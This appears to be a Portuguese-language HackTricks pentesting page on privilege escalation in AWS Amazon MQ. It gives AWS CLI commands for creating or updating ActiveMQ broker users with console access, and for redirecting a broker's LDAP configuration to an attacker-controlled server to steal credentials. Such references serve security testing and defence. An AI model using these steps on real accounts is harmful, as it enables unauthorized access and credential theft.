# AWS - MQ Privesc

{{#include ../../../../banners/hacktricks-training.md}}

## MQ

Para mais informações sobre MQ, consulte:

{{#ref}}
../../aws-services/aws-mq-enum.md
{{#endref}}

### `mq:ListBrokers`, `mq:CreateUser`

Com essas permissões você pode **criar um novo usuário em um broker ActimeMQ** (isso não funciona no RabbitMQ):
```bash
aws mq list-brokers
aws mq create-user --broker-id <value> --console-access --password <value> --username <value>
```
**Impacto potencial:** Acessar informações sensíveis navegando pelo ActiveMQ

### `mq:ListBrokers`, `mq:ListUsers`, `mq:UpdateUser`

Com essas permissões você pode **criar um novo usuário em um broker ActimeMQ** (isso não funciona no RabbitMQ):
```bash
aws mq list-brokers
aws mq list-users --broker-id <value>
aws mq update-user --broker-id <value> --console-access --password <value> --username <value>
```
**Impacto Potencial:** Acessar informações sensíveis ao navegar pelo ActiveMQ

### `mq:ListBrokers`, `mq:UpdateBroker`

Se um broker estiver usando **LDAP** para autorização com **ActiveMQ**, é possível **alterar** a **configuração** do servidor LDAP usado para **um controlado pelo atacante**. Dessa forma o atacante poderá **roubar todas as credenciais enviadas via LDAP**.
```bash
aws mq list-brokers
aws mq update-broker --broker-id <value> --ldap-server-metadata=...
```
Se você, de alguma forma, conseguir encontrar as credenciais originais usadas pelo ActiveMQ, poderá realizar um MitM, roubar as creds, usá-las no servidor original e enviar a resposta (talvez apenas reutilizando as credenciais roubadas você consiga fazer isso).

**Impacto potencial:** Roubar credenciais do ActiveMQ

{{#include ../../../../banners/hacktricks-training.md}}
